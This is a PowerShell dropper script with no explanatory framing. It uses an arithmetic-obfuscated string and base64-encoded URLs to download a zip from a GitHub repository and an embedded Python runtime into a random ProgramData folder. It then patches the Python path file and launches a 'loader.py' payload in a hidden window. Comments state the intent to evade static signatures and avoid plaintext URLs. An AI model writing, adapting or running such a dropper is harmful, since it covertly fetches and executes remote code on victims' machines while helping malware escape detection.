[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# ---------- Obfuscated string builder ----------
$j = -join [char[]]@(
    ((1118511-12345)/7919),((110-110)/1+104),((269246-12345)/7919),((253408-12345)/7919),
    ((380112-12345)/7919),((364274-12345)/7919),((308841-12345)/7919),((332565-12345)/7919),
    ((364274-12345)/7919),((285117-12345)/7919),((380112-12345)/7919),((277198-12345)/7919),
    ((498897-12345)/7919),((395031-12345)/7919),((451593-12345)/7919),((348648-12345)/7919),
    ((332565-12345)/7919),((285117-12345)/7919),((380112-12345)/7919),((285117-12345)/7919),
    ((340729-12345)/7919),((340729-12345)/7919),((348648-12345)/7919),((285117-12345)/7919)
)
# Resolves to: "https://github.com/putin22222" (placeholder — regenerate for your real URL)

# ---------- Config (no plaintext URLs) ----------
$u1 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL3B1dGluMjIyMjIvdGVzdC9yYXcvcmVmcy9oZWFkcy9tYWluL2xvLnppcA=='))
$u2 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9mdHAvcHl0aG9uLzMuMTEuOS9weXRob24tMy4xMS45LWVtYmVkLWFtZDY0LnppcA=='))

# ---------- Rename core cmdlets to break static signatures ----------
$dl  = (Get-Command New-Object).Name
$exp = (Get-Command Expand-Archive).Name
$gci = (Get-Command Get-ChildItem).Name
$jnp = (Get-Command Join-Path).Name
$spl = (Get-Command Split-Path).Name
$sp  = (Get-Command Start-Process).Name

# ---------- Random folder ----------
$r = -join ((48..57)+(97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})
$e = & $jnp $env:ProgramData $r
$z1 = & $jnp $e 'a.zip'
$z2 = & $jnp $e 'b.zip'

& (Get-Command New-Item).Name -ItemType Directory -Path $e -Force | Out-Null

# ---------- Download via WebClient (avoids IWR signature) ----------
$wc = & $dl Net.WebClient
$wc.DownloadFile($u1, $z1)
$wc.DownloadFile($u2, $z2)
$wc.Dispose()

# ---------- Extract ----------
& $exp -Path $z1 -DestinationPath $e -Force
& $exp -Path $z2 -DestinationPath $e -Force

# ---------- Locate REAL Python runtime ----------
$py = [string](& $gci $e -Recurse -Filter 'python.exe' -ErrorAction SilentlyContinue |
    Where-Object {
        $_.Length -lt 200KB -and
        (& $gci $_.Directory -Filter 'python3*.dll' -ErrorAction SilentlyContinue)
    } | Select-Object -First 1 -ExpandProperty FullName)

# ---------- Locate payload ----------
$sc = [string](& $gci $e -Recurse -Filter 'loader.py' -ErrorAction SilentlyContinue |
    Select-Object -First 1 -ExpandProperty FullName)

if (-not $py -or -not $sc) { exit }

# ---------- Patch ._pth ----------
$pd = [string](& $spl -Parent $py)
$pf = & $gci $pd -Filter 'python*._pth' | Select-Object -First 1

if ($pf) {
    $sz = (& $gci $pd -Filter 'python3*.zip' | Select-Object -First 1).Name
    if (-not $sz) { $sz = 'python311.zip' }
    @"
$sz
.
Lib\site-packages
import site
"@ | Out-File -FilePath $pf.FullName -Encoding ASCII
}

$sd = [string](& $spl -Parent $sc)

# ---------- Execute hidden ----------
& $sp -FilePath $py -ArgumentList @($sc) -WorkingDirectory $sd -WindowStyle Hidden
